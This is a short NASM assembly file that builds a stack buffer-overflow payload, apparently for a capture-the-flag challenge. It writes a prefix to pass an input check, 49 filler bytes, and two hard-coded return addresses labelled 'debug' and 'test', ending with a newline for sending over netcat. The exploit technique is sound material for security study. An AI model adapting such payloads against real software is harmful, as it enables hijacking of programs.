; assemble with
; nasm -f bin payload.asm -o payload.bin
db "1/1/1/1"       ; needed to pass processInput function
times 49 db "A"    ; bytes to fill the buffer
dq 0x40096e        ; address of debug
dq 0x400950        ; address of test
db 0x0a            ; ending newline or netcat will not send the data